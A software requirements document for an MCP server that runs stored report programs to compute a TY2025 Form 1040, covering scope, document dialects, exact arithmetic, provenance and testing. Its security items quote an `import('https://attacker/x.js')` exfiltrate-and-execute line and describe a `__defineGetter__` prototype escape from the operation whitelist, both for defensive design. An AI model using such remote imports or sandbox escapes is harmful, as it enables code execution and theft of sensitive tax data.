# Requirements

**Milestone:** v1
**Derived from:** [`.planning/PROJECT.md`](PROJECT.md) · [`todo/plan.md`](../todo/plan.md) · [`fjs/todo/implement-mcp-server.md`](../fjs/todo/implement-mcp-server.md) · [`.planning/research/SUMMARY.md`](research/SUMMARY.md)
**Status:** scoped 2026-08-03

---

## Scope Decisions

These were settled by the user on 2026-08-03 and constrain everything below. Where a
decision overrides a research recommendation, that is recorded explicitly — research
informs, it does not decide.

| Decision | Choice | Note |
|---|---|---|
| **Client** | stdio now, targeting Claude Code / Claude Desktop. **Remote transport (HTTPS + OAuth) is an explicit v2 milestone**, not an unstated assumption. | Resolves C3. ChatGPT cannot connect to a stdio server; the README goal statement must be amended to say so rather than leaving the gap to surface in acceptance. |
| **Tax year** | **TY2025** | **Overrides research's TY2024 recommendation (C4).** Research argued TY2025 could not be diffed against a filed return "at build time" — that reasoning assumed building during the 2025 filing season. It is August 2026 and TY2025 was filed in April 2026, so a filed return exists and Success Criterion 1 is satisfiable. The surviving objection is parameter churn (OBBBA retroactively revised the standard deduction; Schedule 1-A is new), which is a data-sourcing task, not a blocker. |
| **Taxpayer profile** | 65+, has brokerage sales, has dependents, itemizes — "whatever makes it more real-life" | Maximal realism. This is the single largest scope driver in this document and it is a deliberate choice, not an accident. See "Scope Consequences" below. |
| **Security** | Worked on later | The `import()` hole and the exfiltration gap are **accepted and deferred**, not solved. See SEC-* for what v1 still does, and "Accepted Risks" for what it does not. |
| **Entry point** | A distinct export typed `(args) => Effect<CasOp, T>` — not `main` | Answers `todo/plan.md` open question 6, added by Sergey in PR #10. **Adopted over the research recommendation** of `main(ctx)`: research argued for CLI debuggability, but a `CasOp`-scoped signature puts the whitelist in the *type*, and since research separately proved the runtime whitelist is escapable today, the type-level boundary is worth more than `fjs r` compatibility. See EXEC-07. |

### Scope Consequences

The taxpayer profile forces a materially larger form surface than research recommended.
Research's suggested v1 was 1040 core + Schedule B + three document dialects. The selected
profile is roughly 4–5× that:

- **65+ combined with TY2025 makes Schedule 1-A mandatory**, not optional — a 65+ TY2025
  return that omits the senior deduction (Parts I/V/VI, 6% phase-out over $75k/$150k) is
  structurally wrong, not merely incomplete.
- **65+ realistically implies SSA-1099 and 1099-R.** The Social Security Benefits
  Worksheet is an 18-line near-circular computation — research flagged it as one of the two
  hardest single computations in the domain.
- **Brokerage sales pull in the whole capital-gains chain**: 1099-B → Form 8949 →
  Schedule D → the Schedule D Tax Worksheet (strictly harder than the QDCGT worksheet).
  Capital loss carryover also promotes multi-year support from "nice to have" to
  "required".
- **Dependents add Schedule 8812; itemizing adds Schedule A.**

This is buildable and the realism goal is legitimate. It is *not* a five-week v1 in the
shape `todo/plan.md` currently describes. The tiering below exists so the roadmap can
sequence honestly and so the cut line is visible in advance rather than discovered in
week four.

---

## v1 Requirements

Tier labels indicate sequencing pressure, not importance:
**T0** must exist before anything else works · **T1** is the thin end-to-end slice ·
**T2** completes the declared taxpayer profile · **T3** is realism polish.

### Documentation Corrections (DOC-C)

Research found twelve places where a planning document states something now known to be
false. These are hours of work and every one of them is more expensive to discover later.
They come first because subsequent phases would otherwise be planned against text that
dissolves on contact.

- [x] **DOCC-01** *(T0)*: Remove the "validate source with `djs/parser`" remedy from
      `PROJECT.md`, `todo/plan.md`, and `fjs/todo/implement-mcp-server.md`. DJS is a data
      language with no function node; the remedy does not exist. Replace with the deferred
      hardening path.
- [x] **DOCC-02** *(T0)*: ~~Correct the "an operation not in the map simply cannot happen"
      claim to state the guard condition that makes it true.~~ **Done** — and the condition
      is now satisfied by fjs itself as of 0.41.0 (`at` + `assert` in `match`), so the claim
      is true as written. `PROJECT.md` Context records why.
- [x] **DOCC-03** *(T0)*: Amend the README `## Goal` and `PROJECT.md` Success Criterion 2
      to name Claude Code / Claude Desktop as the demonstration client, and record remote
      transport as a v2 milestone.
- [x] **DOCC-04** *(T0)*: Correct `fjs/todo/implement-mcp-server.md`'s claim that the
      server cannot be proof-tested — true of `casMcpServer`, false of `fjs_run`, because
      `import` is already an effect with a virtual interpreter.
- [x] **DOCC-05** *(T0)*: Rewrite the `import()` deferral justification in `PROJECT.md` so
      it rests on schedule grounds with named compensating controls, not on "the sole user
      is trusted and local" — the untrusted party is the document, not the user.
- [x] **DOCC-06** *(T0)*: Record the TY2025 parameter-churn hazard: parameters must come
      from Rev. Proc. 2024-40 **as modified by Rev. Proc. 2025-32**, never from the
      original 2025 inflation-adjustment release.
- [x] **DOCC-07** *(T0)*: Reconcile the storage-layer money representation with
      AGENTS.md's absolute rule that money in a stored JSON document is a string, never a
      JSON number. Correct EXACT-05's text above and `ROADMAP.md`'s Phase 4 success
      criterion 4 and Phase 5 depends-on line, all of which still specified integer cents
      as a JSON *number* at the storage boundary. Only the storage layer flips — exact
      rationals inside computation and decimal strings on the MCP wire are unaffected.

### MCP Server (MCP)

- [x] **MCP-01** *(T0)*: An MCP server over stdio composing fjs's `casToolRegistry` and
      `evoToolRegistry` plus our own, via the exported `fromRegistry` / `mcpStep` /
      `stdioTransport`. No fork of FunctionalScript.
- [x] **MCP-02** *(T0)*: The server registers successfully with `claude mcp add` and
      completes a full `initialize` → `notifications/initialized` → `tools/list` →
      `tools/call` session.
- [x] **MCP-03** *(T0)*: Declare our own `McpConfig` pinned to protocol version
      `2025-11-25`. Do not reuse `casConfig`, which pins `2024-11-05` and identifies the
      server as `functionalscript-cas`.
- [x] **MCP-04** *(T0)*: The impure launcher is a thin root-level `.js` file; all logic
      lives in `.f.js` modules it calls.
- [x] **MCP-05** *(T0)*: stdout carries JSON-RPC and nothing else, asserted in CI across a
      full session. Any diagnostic output goes to stderr.
- [x] **MCP-06** *(T1)*: `finance_schema(dialect)` returns the RTTI schema for a document
      dialect, so the agent reads field names rather than guessing them.
- [x] **MCP-07** *(T1)*: `finance_tax_params(year)` returns the tax-year parameter set, so
      the agent reads parameters rather than recalling them.
- [x] **MCP-08** *(T2)*: `finance_documents_list` enumerates stored documents with their
      dialect, tax year, and subject.
- [x] **MCP-09** *(T3)*: `fjs_check(hash)` smoke-checks a stored program — imports it and
      confirms it exports `report` — without running it to completion. Correcting this
      entry's earlier, stale text (which named `main`, the `NodeProgram` convention
      AGENTS.md reserves for `index.f.js`'s own entry point, not a guest program's
      `Report<T>` export, and claimed the check inspects whether that export "returns an
      `Effect`," which it deliberately never does — doing so would mean executing it, which
      this requirement's own "never running it to completion" mandate forbids) is itself
      part of MCP-09's own scope, mirroring the identical correction already applied to
      DOC-16's entry in this same phase. An agent-productivity feature with **no** security
      value; it must not be described as a security control.

### Execution Spine (EXEC)

- [x] **EXEC-01** *(T0)*: A restricted effect interpreter, `interpret(map)(effect)`,
      translating a guest effect into a host effect. Depends on `fjs/effects` only — not
      CAS, not Evo, not MCP — so it is fully proof-testable in isolation.
- [x] **EXEC-02** *(T0)*: ~~Operation lookup uses `Object.hasOwn` and the operation map has
      a null prototype.~~ **Delivered upstream in fjs 0.41.0**, which this repo now uses:
      `match` looks up via `at` (`getOwnPropertyDescriptor`-based, prototype chain never
      consulted) and `assert`s the handler exists. Verified — the `__defineGetter__` escape
      now throws. Keep a null-prototype map as cheap defence in depth, but it is no longer
      load-bearing and no local guard is required.
- [x] **EXEC-03** *(T0)*: A non-whitelisted operation is refused with a message naming the
      operation *and* the permitted set (`operation not permitted: fetch; permitted:
      casRead, evoList, evoHead, evoRevision`). Agents self-correct from actionable errors
      and cannot from opaque ones. Still ours: 0.41.0 throws the command name but knows
      nothing of the permitted set. **The throw is a bare string, not an `Error`** (`assert`
      throws its message), so the catch must use the caught value directly — `e.message` is
      `undefined` and an `e instanceof Error` branch misses every refusal.
- [x] **EXEC-04** *(T0)*: Regression proofs for prototype-inherited names specifically:
      `constructor`, `toString`, `valueOf`, `hasOwnProperty`, `__defineGetter__`. These are
      the cases a naive `in` or `!== undefined` guard admits. Still wanted after the 0.41.0
      fix — they now pin behaviour we depend on rather than merely hope for, and they cover
      our refusal *reporting*, which is still ours. Assert on the reported text, not the raw
      throw. Include the two-step `__defineGetter__` escalation (install a getter for a
      denied command, then call it).
- [x] **EXEC-05** *(T0)*: The interpreter accumulates the read set as it dispatches, so a
      run record's `inputs[]` is **observed rather than declared**. A program cannot forget
      to cite, or misreport, what it read.
- [x] **EXEC-06** *(T0)*: A step budget bounds execution. `asyncRun` is an unbounded
      `while(true)`; a generated loop with a wrong termination condition otherwise hangs
      the single-process server silently, with no response and no way to cancel.
- [x] **EXEC-07** *(T0)*: A frozen guest ABI. Two constraints fix its shape:
      - **The entry point is a distinct export, not `main`, typed
        `(args) => Effect<CasOp, T>`** — resolving `todo/plan.md` open question 6. fjs
        names entry points by role (`proof` for tests, `main` for Node CLI programs), so a
        report program is a third role. `main` is wrong in both directions: it returns
        `number` (an exit code, not a report), and `NodeProgram = Program<NodeOp>` where
        `NodeOp = … | Fetch | Fs | Http | Forever | Import | …` — a program typed that way
        *declares* it may reach the network. Since `Program<O>` is already generic in the
        operation set, a `CasOp`-scoped signature **puts the whitelist in the type**, so
        `tsc` rejects a network-reaching program before it is ever stored and EXEC-02's
        runtime refusal becomes a backstop rather than the sole defense. Given that the
        runtime defense is currently escapable, that layering is the point. It also settles
        the `forever` sub-question structurally: `Forever` is a `NodeOp` and simply is not
        in `CasOp`. Cost: CLI debuggability via `fjs r`, which resolves `main` literally.
      - **A `ctx` object carries the vocabulary** — combinators, read-only operation
        constructors, money helpers, `args`. Forced by a verified constraint: a blob in CAS
        cannot resolve bare specifiers, so a stored program cannot `import` anything.

      The ABI and the sandbox are the same object, and every stored program is frozen
      against the convention in force when it was written — so this is decided before the
      first program exists, not after.
- [x] **EXEC-08** *(T1)*: An `fjs_run` MCP tool taking `{ hash, args?, subject?, parents? }`
      — **pinned inputs, not just a program hash.** Evo heads resolve at read time, so a
      program that resolves its own heads is not reproducible.
- [x] **EXEC-09** *(T1)*: `fjs_run` reaches `import()` through the `import_` **effect**, not
      a raw expression, making it proof-testable under `fjs/effects/node/virtual` with no
      filesystem.
- [x] **EXEC-10** *(T1)*: The **tool handler** writes the result and run record to CAS —
      not the program. The guest whitelist stays read-only; `casWrite`/`evoAdd` are never
      in it. This makes provenance structural rather than a program-authorship convention.
- [x] **EXEC-11** *(T1)*: `fjs_run` returns result and run-record hashes plus a bounded
      inline preview, with an **explicit size check** before writing the response. The
      stdio line cap is 128 KiB and overflow degrades to a silent `-32603` with no
      indication that size was the problem.
- [x] **EXEC-12** *(T1)*: Total error capture — including non-`Error` throws, missing
      hashes, and import failures — surfaced as a tool-level `errorResult`, never as a
      process crash.
- [x] **EXEC-13** *(T2)*: Run records mark `pinned: true|false`. Only pinned runs count
      toward reproducibility acceptance.

      > **Closed 2026-08-12 as a SCOPE-BOUNDED completion. Read this before citing it.**
      > This requirement was marked complete, reverted as premature (`14942a9`), and marked
      > again. Both a code review and an independent verification examined the second marking
      > and reached the same split conclusion, so the resolution is recorded here rather than
      > left to the next reader to rediscover.
      >
      > **Sentence 1 is unambiguously true.** `fjs/run/module.f.js` declares `pinned` as a
      > required boolean and `checkReferences` enforces both-or-neither in each direction;
      > `fjs_run` derives it and persists it on both the `ok` and `error` arms. Mutation Gate
      > M2 was run twice, by two agents, and reddens `subjectOnlyWithoutParentsPersistsPinnedFalse`.
      >
      > **Sentence 2 is true only in the sense available to v1.**
      > `countsTowardReproducibilityAcceptance` (`fjs/report/provenance/module.f.js`) is
      > correct and mutation-tested, and PROV-05's real-process proof calls it against two
      > genuinely CAS-fetched run records. But **no production code path gates behavior on
      > it** — and none can, because "reproducibility acceptance" names Phase 14's acceptance
      > activity, which the owner skipped on 2026-08-11. There is no pipeline to gate.
      >
      > **Do not read this checkbox as "the running server refuses unpinned runs."** It does
      > not, by design (07-CONTEXT.md: every run gets a record, pinned or not; refusing
      > unpinned runs would implement a policy nobody asked for). If Phase 14 is ever
      > un-skipped, its acceptance run is the consumer this predicate was built for, and that
      > is the moment to re-check this box's honesty.

### Document Formats and Ingestion (DOC)

All dialects follow the `vnd.fjs.revision` precedent: JSON plus a dialect tag, the dialect
as an exact literal in the schema, media type derived mechanically, validation split into
structural (RTTI) and semantic passes.

- [x] **DOC-00** *(T0)*: **One common document base shared by every type** —
      `{ "dialect": "vnd.fjs.<name>", … }` with `dialect` as an exact-literal discriminant,
      so structural validation alone rejects another type's blob. Each type's remaining
      fields are an **fjs RTTI schema** mirroring `revisionSchema`: the schema is the single
      source of truth and the TypeScript type derives from it via `Ts<typeof schema>`, never
      declared twice. Refinements RTTI cannot express structurally (currency exactness, date
      forms, cbase32 hashes) go in a separate semantic check, as `checkReferences` sits
      beside `revisionSchema`. Because an RTTI `Struct` is a string map of types, the base is
      spread into each type — `{ ...base('vnd.fjs.1099'), ...fields }` — rather than needing
      schema inheritance the type system does not have. **Designing the base for the family
      up front is what lets later types land without reopening it**; if a new type forces a
      base change, that is a signal the base was under-designed, worth noting rather than
      absorbing silently.
- [x] **DOC-01** *(T0)*: Evo subject convention — the artifact chain (raw bytes → OCR →
      typed) is rooted at the **cBase32 hash of the original artifact**; each extracted form
      instance gets its own subject keyed on `(payerTin, recipientTin, accountNumber,
      taxYear, formType)`. Human labels live inside snapshots, never in subjects. A subject
      can never be renamed, and CAS has no delete, so this is decided before any real
      document exists.
- [x] **DOC-02** *(T0)*: A **project-local CAS home**, gitignored — not the shared
      `~/.cas`. There is no delete; real SSNs in a shared store cannot be taken back.
- [x] **DOC-03** *(T1)*: `vnd.fjs.ocr` — near-verbatim page-oriented transcription from the
      agent's vision pass, numbers kept as **printed strings** (`"1,234.56"`). Stored as a
      first-class artifact, not a transient step: it is the only record of what the model
      actually saw, and it lets reclassification branch without a second, nondeterministic
      vision pass.
- [x] **DOC-04** *(T1)*: `vnd.fjs.1099int` — typed fields, money **stored as canonical decimal
      strings** and parsed to `bigint` cents at the computation boundary by `fjs/exact`'s
      `centsFromString`. A comma-grouped or otherwise unparseable amount is refused by name.
      **Corrected 2026-08-17 (MAINT-03).** This read *"integer cents, `Number.isSafeInteger`
      guarded"* and described a design the project moved away from: `Number.isSafeInteger` guards
      a **`number`**, and this engine holds money in `bigint` precisely so that no safe-integer
      ceiling exists to guard. The stored form is a decimal string, not an integer. Anyone reading
      the old sentence would have gone looking for a guard that is deliberately absent.
- [x] **DOC-05** *(T2 → pulled forward to Phase 5)*: `vnd.fjs.w2` — box 12 as a list of
      `(code, amount)` pairs (box-12 confusion is a documented model failure); boxes 15–20
      stored faithfully as a repeating array and never computed on.
- [x] **DOC-06** *(T2)*: `vnd.fjs.1099div`. **Adding this dialect forces the QDCGT
      worksheet** (box 1b > 0) and the Schedule D Tax Worksheet (boxes 2b/2d) — schedule
      the worksheet with the dialect, not after it.
- [x] **DOC-07** *(T2)*: `vnd.fjs.1099b` — including the distinction that a blank box 1e
      means "basis not reported", which is **not** zero.
- [x] **DOC-08** *(T2)*: `vnd.fjs.ssa1099` — required by the 65+ profile.
- [x] **DOC-09** *(T2)*: `vnd.fjs.1099r` — required by the 65+ profile.
- [x] **DOC-10** *(T1)*: Every dialect that transcribes a printed IRS form carries the
      **form revision**, not merely the tax
      year. Box semantics drift between revisions.
- [x] **DOC-11** *(T1)*: Every box is explicitly absent-able. Blank is not zero.
- [x] **DOC-12** *(T1)*: The `CORRECTED` checkbox is modelled as data. It is printed on the
      form itself, so amendment is a read signal, not an inference.
- [x] **DOC-13** *(T2)*: A consolidated brokerage 1099 yields *N* typed documents from one
      PDF. One uploaded file is not one document.
- [x] **DOC-14** *(T1)*: Documented CLI ingestion route for artifacts over 128 KiB
      (`npx functionalscript cas add`), plus a cache-refresh path so a store mutated by
      another process is visible to the running server without a restart.
- [x] **DOC-15** *(T2)*: A retraction story via the `archived` flag, and a decision recorded
      on whether report programs must filter archived revisions.
- [x] **DOC-16** *(T3)*: Dialect registration for `fjs/media`'s `detect`. The registry this
      requirement asks for — "a list of dialect decoders that falls through when none
      match" — already ships in the pinned `functionalscript` 0.43.1 as `dialectEntry`/
      `detect` in `fjs/media/module.f.js`; correcting this entry's earlier, stale text
      (which described an older `fjs/media` recognizing only `vnd.fjs.revision`) is itself
      part of DOC-16's own scope, per 15-RESEARCH.md's "State of the Art" finding. This repo
      adopts that already-shipped machinery LOCALLY (`fjs/media/dialects/module.f.js`,
      Plan 15-06) for every one of its own **twenty-eight** classifiable dialects (`expectedDialectCount` in `fjs/media/dialects`; twenty-six also serve a readable schema through `finance_schema`) — this read *thirteen* until 2026-08-17, last true around Phase 20 — wired into `cas_refresh`'s real
      running path — no upstream contribution is needed or was made.
- [x] **DOC-17** *(T2, added Phase 5)*: `vnd.fjs.medical_expenses` — the substantiation record
      behind Schedule A's medical and dental deduction. Unlike every other dialect it is
      taxpayer-asserted rather than transcribed from an information return: no IRS form
      reports out-of-pocket medical spend. Each entry carries `datePaid` (the deductible year
      is the year PAID), provider, category, amount, and an absent-able `reimbursed` — only
      unreimbursed expense is deductible, and "no reimbursement recorded" must stay
      distinguishable from "the insurer paid nothing". No stored total and no 7.5%-of-AGI
      floor: both need an AGI this document cannot see, and belong to the phase that computes
      Schedule A.
      Per AGENTS.md this is an **fjs change** (take a list of dialect decoders, fall through
      when none match), not local glue — same disposition as the `match` gap. Not blocking:
      our own validation does not need `detect`, which matters only for classifying a blob
      of unknown provenance. *Found independently by both the research pass and Sergey.*

- [x] **DOC-18** *(T2, RETROFITTED — see the note below)*: `vnd.fjs.1099g` — Certain Government
      Payments. Two boxes are **computed**: box 1 (unemployment compensation) and box 4
      (federal income tax withheld). Boxes **2, 5, 6, 7 and 9 are refused by name when
      present and non-zero**, and accepted when zero, because each feeds a line this engine
      does not compute — box 2's state-refund taxability needs the *prior* year's return
      under the tax-benefit rule, and this engine holds one year. Box 11 (state income tax
      withheld) is deliberately **not** refused: state withholding never reaches a federal
      return, so storing it without computing it is correct rather than a gap.
      Registered in `kindVocabulary`, `modeledKinds`, `finance_schema` and
      `fjs/media/dialects` in the same commit, per the Phase 8/11/12 precedent.

### Exact Arithmetic (EXACT)

- [x] **EXACT-01** *(T0)*: An upstreamable exact-arithmetic module — integer cents, exact
      rationals, and named rounding modes. fjs has none of this: `bigfloat` is a
      decimal→binary literal helper with two exports, `prime_field` is crypto modular
      arithmetic, and `divUp`/`roundUp` round up only and truncate rather than floor on
      negatives. Tax lines carry losses.
- [x] **EXACT-02** *(T0)*: Floating-point never touches tax math. Verified hazards:
      `1.005 * 100 === 100.49999999999999`, `(1.005).toFixed(2) === "1.00"`.
- [x] **EXACT-03** *(T0)*: IRS half-up rounding, explicitly not `Math.round`, which is
      asymmetric (`Math.round(-2.5) === -2`) on a form full of negatives.
- [x] **EXACT-04** *(T0)*: Rounding is a property of a **1040 line**, not of a value —
      `round(sum(x))`, never `sum(round(x))`. A money type that rounds on construction is
      wrong by construction.
- [x] **EXACT-05** *(T1)*: Layering fixed deliberately: money as a decimal **string** in
      JSON at the storage boundary (never a JSON number — decoded to exact cents by the
      semantic check, per AGENTS.md), rationals inside computation, decimal **strings**
      on the MCP wire — fjs's JSON `Primitive` has no `bigint`, so a bigint schema cannot
      cross JSON-RPC.

### Tax Computation (TAX)

- [x] **TAX-01** *(T1)*: TY2025 parameters stored as **data**, keyed by year, each carrying
      a source citation (Rev. Proc. number and section) and an effective date. Sourced from
      Rev. Proc. 2024-40 **as modified by Rev. Proc. 2025-32**.
- [x] **TAX-02** *(T1)*: The IRS Tax Table stored as data, with **ten rows hand-transcribed from
      the printed Publication 1040 and the remaining ~2,000 checked against invariants**. Rows
      print tax on the interval midpoint, so the table disagrees with bracket arithmetic — MFJ
      $18,000 taxable gives $1,803 by table and $1,800 by brackets.
      **Corrected 2026-08-17 (MAINT-03).** This read *"diffed **row by row** against the published
      Publication 1040 as a `proof`"*, which claimed a per-row comparison against the source that
      does not exist and could not be run without the PDF in the repository. The invariants that
      check the other ~2,000 rows **share code with the generator**, so they cannot catch an error
      in the shared part — they establish internal consistency, not agreement with the IRS. That is
      a materially weaker guarantee than the original sentence advertised, and worth having written
      down: a transcription error outside the ten hand-typed rows would survive this suite.
- [x] **TAX-03** *(T1)*: Explicit line-16 method dispatch across all branches — Tax Table,
      Tax Computation Worksheet, QDCGT worksheet, Schedule D Tax Worksheet — with a proof
      per branch. Line 16 is not bracket arithmetic.
- [x] **TAX-04** *(T1)*: Boundary proofs at `threshold − 1¢`, `threshold`, `threshold + 1¢`
      for every threshold in the parameter data.
- [x] **TAX-05** *(T1)*: Form 1040 core lines 1a–37.
- [x] **TAX-06** *(T1)*: Standard deduction with age and blindness increments.
- [x] **TAX-07** *(T2)*: Schedule B — interest and ordinary dividends, including the $1,500
      threshold and the foreign-account questions.
- [x] **TAX-08** *(T2)*: Qualified Dividends and Capital Gain Tax Worksheet (~25 lines),
      which calls **back into** the Tax Table for its ordinary-income component.
      **Delivered in Phase 10**, not Phase 12 as the roadmap originally scheduled:
      `fjs/tax/line16/qdcgt/module.f.js` imports `baseTaxForAmount` from `fjs/tax/table`
      and its proofs assert `method22 === 'taxTable'`. Verified 2026-08-07 while scoping
      Phase 12; the phase text that scheduled building it was stale and has been corrected.
- [x] **TAX-09** *(T2)*: **Schedule 1-A Parts I/V/VI** — mandatory given TY2025 + 65+.
      Senior deduction with 6% phase-out over $75k/$150k, feeding Form 1040 line 13b.
- [x] **TAX-10** *(T2)*: Social Security Benefits Worksheet — an 18-line near-circular
      computation. Required by the 65+ profile.
- [x] **TAX-11** *(T2)*: Form 8949 and Schedule D, including the Schedule D Tax Worksheet.
      Required by brokerage sales.
- [x] **TAX-12** *(T2)*: Schedule 8812. Required by dependents.
- [x] **TAX-13** *(T2)*: Schedule A. Required by itemizing, and it must compare against the
      standard deduction rather than assuming itemizing wins.
- [x] **TAX-14** *(T2)*: Schedule 1 and Schedule 2/3 to the extent the profile reaches them.
- [x] **TAX-15** *(T2)*: Worksheets modelled in IRS order, one named pure function per
      worksheet carrying the printed form's line numbers. **No variable named `magi`** — the
      MAGI for the IRA deduction, Roth eligibility, the Premium Tax Credit, IRMAA, and the
      student-loan-interest deduction have different add-back lists.
- [x] **TAX-16** *(T1)*: A **scope guard** — unmodeled input causes a loud refusal, never a
      silently omitted line. This is what makes a partial 1040 honest instead of quietly
      wrong, and it is how REQ TAX-05's "full line-by-line" claim stays truthful.
- [x] **TAX-17** *(T3)*: Multi-year support, including capital loss carryover, which the
      brokerage profile promotes from optional to required.
- [x] **TAX-18** *(T2, RETROFITTED — see the note below)*: Unemployment compensation reaching
      the return. Schedule 1 line 7 becomes a real computed line summing box 1 across every
      1099-G, flowing to **1040 line 8** via Schedule 1's Part I total; 1099-G box 4 joins
      **1040 line 25b**. Before this, Schedule 1 line 7 was a declared zero whose only scope
      kind was a coarse catch-all — which is precisely why TAX-16's guard **refused a real
      taxpayer's transcript**, correctly, on the first real document the engine ever saw.
      `Form1040Inputs.unemploymentForms` is a **required** field, so `tsc` enforces it on
      every production caller.

### Provenance and Reporting (PROV)

- [x] **PROV-01** *(T1)*: A report line type in which `{ value }` without `{ sources }`
      **does not typecheck**. Traceability enforced by the type system, not by convention.
- [x] **PROV-02** *(T1)*: Every computed line carries `(documentHash, boxPath, value)`
      tuples plus the rule or worksheet line it implements.
- [x] **PROV-03** *(T1)*: A `vnd.fjs.run` record — program hash, observed inputs, result
      hash, status, pinned flag — written by the tool handler on every run.
- [x] **PROV-04** *(T2)*: Report output states the tax year, the parameter-set hash, and the
      program hash alongside the figures.
- [x] **PROV-05** *(T2)*: Re-running a pinned program over the same inputs reproduces the
      report **byte-identically**, verified adversarially: add an amended revision *between*
      two runs and assert the output does not move. A reproducibility check that passes
      only because nothing changed is not a check.
- [x] **PROV-06** *(T3)*: Mechanical Form 1040-X columns from a report diff. Form 1040-X is
      literally a three-column diff (A original, B net change, C correct), so corrected
      document → new revision → re-run → diff yields Columns A/B/C with per-line source
      hashes already attached. No new mechanism required.
- [x] **PROV-07** *(T2)*: An anti-hardcoding check — CAS read count and numeric-literal
      audit reported with each run, plus a perturbation gate (change an input, assert the
      output moves). `main = () => pure({ line16: 9137 })` satisfies every other criterion
      while defeating the entire thesis.
- [x] **PROV-08** *(T3)*: A second, non-tax report over the same documents — the cheapest
      possible demonstration that "reports are programs" rather than a tax engine wearing a
      disguise.

### Security (SEC)

Deferred by explicit decision. What remains here is what costs essentially nothing and
would be materially more expensive to retrofit.

- [x] **SEC-01** *(T0)*: The registered `claude mcp add` launcher carries
      `node --permission` with scoped `--allow-fs-*` from the **first** registration.
      Registering later means the unsafe configuration is the one everyone already has.
- [x] **SEC-02** *(T1)*: A textual import-specifier allow-list enforced before a program is
      materialized — roughly 20 lines, and it closes the
      `import('https://attacker/x.js')` exfiltrate-and-execute variant entirely.
- [x] **SEC-03** *(T1)*: Programs materialized under **content-hash-derived filenames**. The
      ESM cache is keyed by URL and never evicts, so a reused temp filename silently re-runs
      the *first* program.
- [x] **SEC-04** *(T0)*: ~~An upstream bug report to FunctionalScript for the `match`
      prototype-dispatch soundness hole.~~ **Done and closed** —
      [functionalscript#1419](https://github.com/functionalscript/functionalscript/pull/1419),
      fixed in 0.41.0. Note
      [functionalscript#1420](https://github.com/functionalscript/functionalscript/issues/1420)
      is a duplicate of the same defect, filed independently from this branch before #1419
      was known here; it is closed as such.

### Integration and End-to-End Testing (TEST)

Added mid-Phase-7, at the user's direction, after an audit found the project had **133
project-local proofs and exactly one real-process test**. Every other proof runs under
`fjs/effects/node/virtual` — mocked filesystem, mocked stdio, no separate OS process.

The audit's finding that forced this section: **the product's central seam cannot be tested in
the virtual harness at all.** `virtual`'s `writeFile` stores a file as an array of `Vec` chunks
while its `import_` requires the entry at a path to be a `JsModule` function — verified against
upstream source. So "write a program's bytes to disk, then `import()` and run them" is
*structurally uncomposable* in a virtual session. Phase 7's own end-to-end plan therefore used a
`JsModule` stand-in for materialization, which means `fjs_run` — the product — would have shipped
with its central seam evidenced only by a mock.

`cas-refresh-cross-process.test.js` already established the pattern and the precedent, and its
header states the principle these requirements generalise: *"an in-process simulation does not
test the thing that breaks."* It was a one-off; this section makes it a practice.

- [x] **TEST-01** *(T1)*: A real-process integration test for `fjs_run`: a genuinely separate
      `node index.js <home>` OS process, driven over **real stdin/stdout JSON-RPC** through a
      full `initialize` → `notifications/initialized` → `tools/list` → `tools/call` session,
      against a real temporary CAS home on a real filesystem. It must assert the returned figure
      and the result/run-record hashes, **and** that the materialized `.mjs` actually reached
      disk — the one assertion no virtual proof can make.
- [x] **TEST-02** *(T1)*: Every MCP tool this project exposes is exercised at least once through
      that real stdio session, not only through `virtual`. A tool proven solely in-process has
      not been proven to be reachable by a client.
- [x] **TEST-03** *(T2)*: Each subsequent phase that adds a tool, a dialect, or a new seam adds
      real-process coverage for it in the same session harness. The standing rule: a phase is not
      complete when its virtual proofs are green — it is complete when the thing a client would
      actually call has been called.
- [x] **TEST-04** *(T2)*: The integration suite is separable from the proof suite, so the
      per-commit loop can skip the real-process tests while the integration layer still runs before
      a phase is marked complete. **Amended 2026-08-17 by MAINT-03/MAINT-02 from measurement — the
      original text's rationale was false in both of its numbers.** It read *"Real-process tests
      cost seconds each; the 133 virtual proofs cost milliseconds in total, and conflating them
      would push developers to skip both."* Measured on `279f247`:

      | | tests | wall clock |
      |---|---|---|
      | `npm run test:proofs` (`node --test all.test.js`) | 4260 | **52.7s** |
      | the seven root real-process and gate files | 13 | **7.0s** |
      | `npm test` | **8533** | 25–140s, ~5× spread with load |

      So the proofs are **the slow half, not the fast half** — 133 proofs became roughly 2,010 and
      the suite that "cost milliseconds in total" now costs the better part of a minute, while every
      real-process test and repo-wide gate together costs seven seconds. Splitting them out to keep
      the per-commit loop fast would, today, skip the cheap half.

      **And the parts do not sum.** 4260 + 13 = 4273 against `npm test`'s 8533 — a difference of
      *exactly* 4260. **The proof suite executes twice under `npm test`.** STATE.md's anti-pattern
      table already recorded a 2× inflation in the proof *metric* when the `functionalscript`
      submodule is initialized; this shows the proofs are not merely double-*counted*, they are
      double-*run*, at a real cost of about 53 seconds per invocation.

      **DIAGNOSED AND FIXED the same day.** The paragraph above first said the mechanism was
      undiagnosed, on the strength of *"no `*.test.js` exists under `functionalscript/`"* — which
      was true and was the wrong search. Node's default discovery matches **`*.test.ts`** as well,
      and Node 25 runs TypeScript natively, so bare `node --test` was picking up
      `functionalscript/fjs/emergent_testing/all.test.ts` — the vendored submodule's own entry
      point — and re-walking the whole proof set. 4273 + 4260 = 8533, exactly.

      Fixed by pinning `npm test` to `node --test *.test.js`, which is also how `test:proofs` and
      `test:integration` already name their files, and which matches AGENTS.md's rule that
      root-level `*.test.js` are the documented exception:

      | | before | after |
      |---|---|---|
      | `npm test` | 8533 tests | **2242** (was recorded here as 4273 until 2026-08-17) |
      | wall clock | ~60s (25–140 under load) | **5–31s, load-dependent** (four runs on 2026-08-17 with no code change between them gave 31s, 4.9s, 12.5s, 11.9s — the spread is three real-process tests, not the proofs) |
      | project-local proof leaves | 4048 raw vs 2024 unique | **2218, each printed once** |

      **Nothing is skipped** — every proof and every root test still runs, once. `sort -u` in the
      leaf-count command is no longer load-bearing and is kept as a cheap assertion that it stays
      that way. `npm run test:proofs` is the separable path this requirement asked for.

Scope note, deliberately: these requirements do **not** ask for the virtual proofs to be
replaced. The virtual harness is fast, deterministic, and proves logic well. What it cannot do is
prove that two real subsystems meet. Both layers are wanted, **and both exist** — this sentence said only one did, until 2026-08-17. TEST-01/02 delivered the real-process harness in Phase 7 and TEST-03 has kept it growing; the root `*.test.js` files are that layer, and `npm test` runs them alongside the proofs.

### Deferred Judgments (MAINT)

Decisions that surfaced during Phases 7-9 and were deliberately **not** taken in the moment, because
each is a maintainer's call rather than an implementation detail. They are recorded as requirements
so they are scheduled rather than remembered. All are T3 — none blocks the v1 tax result.

